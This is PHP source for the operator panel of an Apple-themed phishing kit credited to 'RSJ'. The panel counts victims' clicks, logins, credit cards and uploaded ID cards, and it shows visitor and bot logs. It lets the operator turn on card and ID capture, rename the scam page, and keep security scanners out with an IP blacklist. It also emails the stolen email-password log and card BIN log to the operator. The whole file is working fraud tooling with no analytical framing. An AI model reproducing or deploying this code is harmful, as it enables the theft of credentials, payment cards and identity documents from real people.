<?php

/*
RSJ
*/

error_reporting(0);
require_once "setting.php";

if($_GET["panel"] != $panel)
    {
           exit('<script>alert("HIROPROTECT")</script><meta http-equiv="refresh" content="0; url=/"/>');
    }
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <title>RSJ</title>
    <link href="//brobin.github.io/hacker-bootstrap/css/hacker.css" rel="stylesheet">

     <style>
    .tall-row {
        margin-top: 40px;
    }
    .modal {
        position: relative;
        top: auto;
        right: auto;
        left: auto;
        bottom: auto;
        z-index: 1;
        display: block;
    }
    </style>
	<script type="text/javascript">
		$(document).ready(function() {
			$('.form-log').load('bot_log.php');
		});
	</script>
</head>

<body>
    <nav class="navbar navbar-default navbar-static-top">
        <div class="container">
            <div class="navbar-header">
                <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
                    <span class="sr-only">Toggle navigation</span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                </button>
                <a class="navbar-brand" href="#"><b>RSJ KINGDOM <font color="red">X</font><font color="gray"> APPLE</b></font></a>
            </div>
            <div id="navbar" class="navbar-collapse collapse">
                <ul class="nav navbar-nav navbar-right">

                    <li>
                        <a href="https://<?php echo $_SERVER['SERVER_NAME']."/".$param;?>" target="_blank">View Scam</a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>
    <div class="container">
        <div class="row">
            <div class="col-lg-6">
                <div class="well">
                        <fieldset>
                            <legend>Mode</legend>
                            <center><font color ="yellow">* Read file "readme.txt" !!</font></center><br>
<form  method="POST" class="form-horizontal">
                                 <div class="form-group">
                                <label for="inputEmail" class="col-lg-2 control-label">True Login</label>
                                <div class="col-lg-10">
                       <input class="col-lg-5 control-label" type="text"  readonly="true" name="tll" value="<?php echo $t_login; ?>"></input>
                        <select class="col-lg-5 control-label" name="tlb">
                                        <option value="yes">Yes</option>
                                        <option value="no">No</option>
                                    </select>
                            <input type="submit" class="btn btn-primary control-label" name="tls" value="Save"></input>
                          </div>
                            </div>


</form>
                        <form  method="POST" class="form-horizontal">
                                 <div class="form-group">
                                <label for="inputEmail" class="col-lg-2 control-label">Panel</label>
                                <div class="col-lg-10">
                       <input class="col-lg-5 control-label" type="text"  readonly="true" name="keylama" value="<?php echo $panel; ?>"></input>
                        <input class="col-lg-5 control-label" type="text" name="keybaru" placeholder="KeyPanel"></input>
                            <input type="submit" class="btn btn-primary control-label" name="key" value="Save"></input>
                          </div>
                            </div>


</form>
<form  method="POST" class="form-horizontal">
                                 <div class="form-group">
                                <label for="inputEmail" class="col-lg-2 control-label">Site Scam</label>
                                <div class="col-lg-10">
                       <input class="col-lg-5 control-label" type="text"  readonly="true" name="parla" value="<?php echo $param; ?>"></input>
                        <input class="col-lg-5 control-label" type="text" name="parba" placeholder="ParameterSite"></input>
                            <input type="submit" class="btn btn-primary control-label" name="param" value="Save"></input>
                          </div>
                            </div>


</form>
<form  method="POST" class="form-horizontal">
                                 <div class="form-group">
                                <label for="inputEmail" class="col-lg-2 control-label">User Agent</label>
                                <div class="col-lg-10">
                       <input class="col-lg-5 control-label" type="text"  readonly="true" name="ual" value="<?php echo $user_allow; ?>"></input>
                        <select class="col-lg-5 control-label" name="uab">
                                        <option value="true">Yes (True)</option>
                                        <option value="false">No (False)</option>
                                    </select>
                            <input type="submit" class="btn btn-primary control-label" name="usas" value="Save"></input>
                          </div>
                            </div>


</form>

<form  method="POST" class="form-horizontal">
                                 <div class="form-group">
                                <label for="inputEmail" class="col-lg-2 control-label">One Time Access</label>
                                <div class="col-lg-10">
                       <input class="col-lg-5 control-label" type="text"  readonly="true" name="otal" value="<?php echo $One_Time_Access; ?>"></input>
                        <select class="col-lg-5 control-label" name="otab">
                                        <option value="block">Yes (Block)</option>
                                        <option value="non">No (Non)</option>
                                    </select>
                            <input type="submit" class="btn btn-primary control-label" name="otas" value="Save"></input>
                          </div>
                            </div>


</form>
<form  method="POST" class="form-horizontal">
                                 <div class="form-group">
                                <label for="inputEmail" class="col-lg-2 control-label">One Click</label>
                                <div class="col-lg-10">
                       <input class="col-lg-5 control-label" type="text"  readonly="true" name="otal" value="<?php echo $One_Time_Access; ?>"></input>
                        <select class="col-lg-5 control-label" name="otab">
                                        <option value="block">Active (Block)</option>
                                        <option value="non">non_active (Non)</option>
                                    </select>
                            <input type="submit" class="btn btn-primary control-label" name="otas" value="Save"></input>
                          </div>
                            </div>


</form>
<p style="text-align: center;"><span style="background-color: #ff0000; color: #ffff00;">BOT<br />=========================================</span></p>
                        <div class="form-log" style="font-size: 10px; overflow:scroll; height:410px;"><?php include "bot_log.php";?></div>
                </div>
                <button href="#" class="btn btn-info">Click <span class="badge"><?php echo empty(file_get_contents("assets/logs/._click_.txt")) ? "0" : file_get_contents("assets/logs/._click_.txt"); ?></span></button>
<button href="#" class="btn btn-warning">Login <span class="badge"><?php echo empty(file_get_contents("assets/logs/._login_.txt")) ? "0" : file_get_contents("assets/logs/._login_.txt"); ?></span></button>
<button href="#" class="btn btn-danger">CC <span class="badge"><?php echo empty(file_get_contents("assets/logs/._ccz_.txt")) ? "0" : file_get_contents("assets/logs/._ccz_.txt"); ?></span></button>
<button href="#" class="btn btn-primary">ID Card <span class="badge"><?php echo empty(file_get_contents("assets/logs/._upload_.txt")) ? "0" : file_get_contents("assets/logs/._upload_.txt"); ?></span></button>
<form method="POST" action""><button class="btn btn-default" type="submit" name="rd">Reset Log</button>
<button class="btn btn-default" type="submit" name="sd">Get Log Empas</button>
<button class="btn btn-default" type="submit" name="sb">Get Log Bin</button></form>

            </div>

             <div class="col-lg-6">
                <div class="well">
                    <form method="POST" class="form-horizontal">
                        <fieldset>
                            <legend>Email</legend>
                            <div class="form-group">
                                <label for="inputEmail" class="col-lg-2 control-label">New Email</label>
                                <div class="col-lg-10">
                                    <input class="form-control"  name="baru" value="" placeholder="emailexample.com" type="text">
                                </div>
                            </div>
                         <div class="form-group">
                                <label for="inputEmail" class="col-lg-2 control-label">Email Active</label>
                                <div class="col-lg-10">
                                    <input class="form-control" readonly="true" name="lama" value="<?php echo $Your_Email; ?>" type="text">
                                </div>
                            </div>
                            <input type="submit" class="btn btn-primary" name="email" value="Change Email"></input>
                    </form>
                    <br>
 <form  method="POST" class="form-horizontal">
                                 <div class="form-group">
                                <label for="inputEmail" class="col-lg-2 control-label">Double CC</label>
                                <div class="col-lg-10">
                       <input class="col-lg-5 control-label" type="text"  readonly="true" name="dccl" value="<?php echo $doublecc; ?>"></input>
                                        <select class="col-lg-5 control-label" name="dccb">
                                        <option value="active">Yes (Active)</option>
                                        <option value="notactive">No (NonActive)</option>
                                    </select>
                            <input type="submit" class="btn btn-primary control-label" name="dccs" value="Save"></input>
                          </div>
                            </div>


</form>
<form  method="POST" class="form-horizontal">
                                 <div class="form-group">
                                <label for="inputEmail" class="col-lg-2 control-label">Id Card</label>
                                <div class="col-lg-10">
                       <input class="col-lg-5 control-label" type="text"  readonly="true" name="idcl" value="<?php echo $idcard; ?>"></input>
                        <select class="col-lg-5 control-label" name="idcb">
                                        <option value="yoi">Yes (Yoi)</option>
                                        <option value="noi">No (Noi)</option>
                                    </select>
                            <input type="submit" class="btn btn-primary control-label" name="idcs" value="Save"></input>
                          </div>
                            </div>


</form>
<form  method="POST" class="form-horizontal">
                                 <div class="form-group">
                                <label for="inputEmail" class="col-lg-2 control-label">TypeLogin</label>
                                <div class="col-lg-10">
                                    <input class="col-lg-5 control-label" type="text"  readonly="true" name="tyll" value="<?php echo $typelogin; ?>"></input>
                                    <select class="col-lg-5 control-label" name="tylb">
                                        <option value="locked">Locked</option>
                                        <option value="invoice">Invoice</option>
                                    </select>
                            <input type="submit" class="btn btn-primary control-label" name="tyls" value="Save"></input>
                          </div>
                          <br>
                    <br>
                    <br>
                    <br>
                          <p style="text-align: center;"><span style="background-color: #00ff00; color: #ff0000;">VISITOR<br />=========================================</span></p>
                    <div class="form-log" style="font-size: 10px; overflow:scroll; height:410px;"><?php include "visitor_log.php";?></div>
                            </div>


</form>
           


                </div>
            </div>


                    

                </div>
            </div>
        </div>
                        </div>
                    </div>


                </div>
            </div>



            </div>
            <?php
   unlink("set.php");

    $lama   = trim($_POST['lama']);
    $baru   = trim($_POST['baru']);
    $keylama = trim($_POST['keylama']);
    $keybaru = trim($_POST['keybaru']);
    $parla = trim($_POST['parla']);
    $parba = trim($_POST['parba']);
    $ual = trim($_POST['ual']);
    $uab = trim($_POST['uab']);
    $tll = trim($_POST['tll']);
    $tlb = trim($_POST['tlb']);
    $otal = trim($_POST['otal']);
    $otab = trim($_POST['otab']);
    $dccl = trim($_POST['dccl']);
    $dccb = trim($_POST['dccb']);
    $idcl = trim($_POST['idcl']);
    $idcb = trim($_POST['idcb']);
    $tyll = trim($_POST['tyll']);
    $tylb = trim($_POST['tylb']);
    $file   = "setting.php";
    $isi    = file_get_contents($file);

if(isset($_POST['email'])) {
    if(preg_match("#\b$lama\b#is", $isi)) {
        $isi = str_replace($lama,$baru,$isi);
        $buka = fopen($file,'w');
        fwrite($buka,$isi);
        fclose($buka);

        echo "<script>alert('Success')</script>";
        echo "<meta http-equiv='refresh' content='0; url=#ganti_email'/>";
    }
    else
         echo "<script>alert('Failed')</script>";
}
else if(isset($_POST['key'])) {
   if(preg_match("#\b$keylama\b#is", $isi)) {
        $isi = str_replace($keylama,$keybaru,$isi);
        $buka = fopen($file,'w');
        fwrite($buka,$isi);
        fclose($buka);

        echo "<script>alert('Success')</script>";
        echo "<meta http-equiv='refresh' content='0; url=http://$_SERVER[HTTP_HOST]/priv/$keybaru#ganti_key'/>";
          echo "<meta http-equiv='refresh' content='0; url=http://$_SERVER[HTTP_HOST]/priv/$keybaru#ganti_key'/>";
    }
    else
         echo "<script>alert('Failed')</script>";
}else if(isset($_POST['usas'])) {
   if(preg_match("#$ual#is", $isi)) {
        $isi = str_replace($ual,$uab,$isi);
        $buka = fopen($file,'w');
        fwrite($buka,$isi);
        fclose($buka);
        echo "<script>alert('Success')</script>";
        echo "<meta http-equiv='refresh' content='0; url=#change_userallow'/>";
          echo "<meta http-equiv='refresh' content='0; url=#change_userallow'/>";
    }
    else
         echo "<script>alert('Failed')</script>";
}else if(isset($_POST['param'])) {
    if(preg_match("#param = \"$parla\"#is", $isi)) {
        $isi = str_replace("$parla\"; // Parameter Redirect","$parba\"; // Parameter Redirect",$isi);
        $buka = fopen($file,'w');
        fwrite($buka,$isi);
        fclose($buka);

        rename($parla.".php",$parba.".php");

        echo "<script>alert('Success')</script>";
        echo "<meta http-equiv='refresh' content='0; url=#ganti_parameter'/>";
        echo "<meta http-equiv='refresh' content='0; url=#ganti_parameter'/>";
    }
    else
         echo "<script>alert('Failed')</script>";
}else if(isset($_POST['tls'])) {
   if(preg_match("#$tll#is", $isi)) {
        $isi = str_replace($tll,$tlb,$isi);
        $buka = fopen($file,'w');
        fwrite($buka,$isi);
        fclose($buka);
        echo "<script>alert('Success')</script>";
        echo "<meta http-equiv='refresh' content='0; url=#change_truelogin'/>";
          echo "<meta http-equiv='refresh' content='0; url=#change_truelogin'/>";
    }
    else
         echo "<script>alert('Failed')</script>";
}else if(isset($_POST['otas'])) {
   if(preg_match("#$otal#is", $isi)) {
        $isi = str_replace($otal,$otab,$isi);
        $buka = fopen($file,'w');
        fwrite($buka,$isi);
        fclose($buka);
        echo "<script>alert('Success')</script>";
        echo "<meta http-equiv='refresh' content='0; url=#change_OneTimeAccess'/>";
          echo "<meta http-equiv='refresh' content='0; url=#change_OneTimeAccess'/>";
    }
    else
         echo "<script>alert('Failed')</script>";
}else if(isset($_POST['dccs'])) {
   if(preg_match("#$dccl#is", $isi)) {
        $isi = str_replace($dccl,$dccb,$isi);
        $buka = fopen($file,'w');
        fwrite($buka,$isi);
        fclose($buka);
        echo "<script>alert('Success')</script>";
        echo "<meta http-equiv='refresh' content='0; url=#change_DoubleCC'/>";
          echo "<meta http-equiv='refresh' content='0; url=#change_DoubleCC'/>";
    }
    else
         echo "<script>alert('Failed')</script>";
}else if(isset($_POST['idcs'])) {
   if(preg_match("#$idcl#is", $isi)) {
        $isi = str_replace($idcl,$idcb,$isi);
        $buka = fopen($file,'w');
        fwrite($buka,$isi);
        fclose($buka);
        echo "<script>alert('Success')</script>";
        echo "<meta http-equiv='refresh' content='0; url=#change_IDCard'/>";
          echo "<meta http-equiv='refresh' content='0; url=#change_IDCard'/>";
    }
    else
         echo "<script>alert('Failed')</script>";
}
else if(isset($_POST['tyls'])) {
   if(preg_match("#$tyll#is", $isi)) {
        $isi = str_replace($tyll,$tylb,$isi);
        $buka = fopen($file,'w');
        fwrite($buka,$isi);
        fclose($buka);
        echo "<script>alert('Success')</script>";
        echo "<meta http-equiv='refresh' content='0; url=#change_TypeLogin'/>";
          echo "<meta http-equiv='refresh' content='0; url=#change_TypeLogin'/>";
    }
    else
         echo "<script>alert('Failed')</script>";
}
else if(isset($_POST['rd'])) {
       unlink("._no_.txt");
       unlink("._nob_.txt");
       unlink("assets/logs/._click_.txt");
       unlink("assets/logs/._login_.txt");
       unlink("assets/logs/._ccz_.txt");
       unlink("assets/logs/._upload_.txt");
       unlink("._logz_.txt");
       unlink("assets/logs/hmp.log");
       unlink("assets/logs/bin.log");
       unlink("error_log");
       unlink("._ssid.txt");
       // unlink("assets/includes/blacklist.dat");
       unlink("assets/logs/accepted_visitors.txt");
       unlink("assets/logs/ip2_log.txt");
       unlink("assets/logs/denied_visitors.txt");
       unlink("assets/logs/visitor_logged_in.txt");

       $filee = file_get_contents("assets/includes/blacklist.dat");
       $cek = preg_match_all("/# NETCRAFT IP RANGES(.*)# USERS COMPLETED/is", $filee, $res) ? $res : null;
       $buka = fopen("assets/includes/blacklist.dat",'w');
       fwrite($buka,$cek[0][0]."\r\r");
       fclose($buka);

       echo "<script>alert('Success')</script>";
       echo "<meta http-equiv='refresh' content='0; url=#reset_data'/>";
}
else if(isset($_POST['sd'])) {
    $empass          = file_get_contents(dirname(__FILE__)."/assets/logs/hmp.log");
    $exem = explode("\n",$empass);
    $total          = count($exem);
    $total = $total-1;
    if($total <= 0)
        {
            echo '<script>alert("Failed\n\Email And Password Not Found.")</script>';
        }
    else
        {
            $fil = "._no_.txt";
            $last = (file_get_contents($fil) == "" ? "1" : file_get_contents($fil));
            $urut = fopen($fil,"w");
            fwrite($urut,$last+1);
            fclose($urut);

            $headers          = "From: Empas Apel <empasRSJ.team>\r\n";
            $headers         .= "Reply-to: RSJ.team\r\n";
            $headers         .= "MIME-Version: 1.0\r\n";
            $headers         .= "Content-Type: text/plain; charset=UTF-8\r\n";
            $subj            = "[ Empas #$last ] [ Total $total Lines ] [ ".date("D, d-F-y H:i")." ]";
            $to              = $Your_Email;
            $data            = "-===================== RSJ =====================-

  -----------------------------------------------------------------
$empass
  -----------------------------------------------------------------";

            mail($to, $subj, $data, $headers);

            echo "<script>alert('Success')</script>";
            echo "<meta http-equiv='refresh' content='0; url=#send_empas'/>";
        }
}
else if(isset($_POST['sb'])) {
    $binbin          = file_get_contents(dirname(__FILE__)."/assets/logs/bin.log");
    $exbin = explode("\n",$binbin);
    $total          = count($exbin);
    $total = $total-1;
    if($total <= 0)
        {
            echo '<script>alert("Failed~\n\nBIN Not Found.")</script>';
        }
    else
        {
            $fil = "._nob_.txt";
            $last = (file_get_contents($fil) == "" ? "1" : file_get_contents($fil));
            $urut = fopen($fil,"w");
            fwrite($urut,$last+1);
            fclose($urut);

            $headers          = "From: Bin Colletions <binRSJ.TEAM>\r\n";
            $headers         .= "Reply-to: RSJ.team\r\n";
            $headers         .= "MIME-Version: 1.0\r\n";
            $headers         .= "Content-Type: text/plain; charset=UTF-8\r\n";
            $subj            = "[ Bin #$last ] [ Total $total Cards ] [ ".date("D, d-F-y H:i")." ]";
            $to              = $Your_Email;
            $data            = "-===================== RSJ =====================-

  -----------------------------------------------------------------
$binbin
  -----------------------------------------------------------------";

            mail($to, $subj, $data, $headers);

            echo "<script>alert('Success')</script>";
            echo "<meta http-equiv='refresh' content='0; url=#send_bin'/>";
        }
}
else if(isset($_POST['sl'])) {
            $fil2 = "._logz_.txt";
            $lasts = (file_get_contents($fil2) == "" ? "1" : file_get_contents($fil2));
            $urut = fopen($fil2,"w");
            fwrite($urut,$lasts+1);
            fclose($urut);

            $headers          = "From: RSJ Report <reportHIRO-RSJKING.TEAM>\r\n";
            $headers         .= "Reply-to: Rsj.team\r\n";
            $headers         .= "MIME-Version: 1.0\r\n";
            $headers         .= "Content-Type: text/plain; charset=UTF-8\r\n";
            $subj            = "[ Report #$lasts ] [ RSJ ] [ ".date("D, d-F-y H:i")." ]";
            $to              = $Your_Email;
            $tor = $tglorder;
            $tcl = (file_get_contents("assets/logs/._click_.txt") == "" ? "0" : file_get_contents("assets/logs/._click_.txt"));
            $tlo = (file_get_contents("assets/logs/._loginz_.txt") == "" ? "0" : file_get_contents("assets/logs/._loginz_.txt"));
            $tcc = (file_get_contents("assets/logs/._ccz_.txt") == "" ? "0" : file_get_contents("assets/logs/._ccz_.txt"));
            $tlh = substr_count(file_get_contents("._ssid.txt")," ");
            $det = array("u" => $_SERVER['SERVER_NAME'],"p" => $_SERVER['SERVER_NAME'].$_SERVER["REQUEST_URI"],"m" => $umurlog,"tc" => $tcl,"tl" => $tlo,"tcc" => $tcc,"lh" => $tlh);
            $data            = "
-===================== RSJ =====================-
# Domen Scam     :   ".$det['u']."
# Panel Scam       :   ".$det['p']."
# Umur Scam        :   ".$det['m']." hari
# Tanggal Order    :   ".$tor."
# Total Load          :   ".$det['lh']."
# Total Klik            :   ".$det['tc']."
# Total Login         :   ".$det['tl']."
# Total Card          :   ".$det['tcc']."
-===================== RSJ =====================-";

            mail($to, $subj, $data, $headers);

            echo "<script>alert('Success')</script>";
            echo "<meta http-equiv='refresh' content='0; url=#send_report'/>";
}
?>
 <div class="row tall-row">
            <div class="col-md-12">
                <p>Created by RSJ. &copy; 2018 </p>
            </div>
        </div>
         <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.2/jquery.min.js"></script>
    <script src="//maxcdn.bootstrapcdn.com/bootstrap/3.3.4/js/bootstrap.min.js"></script>

        </body>
        </html>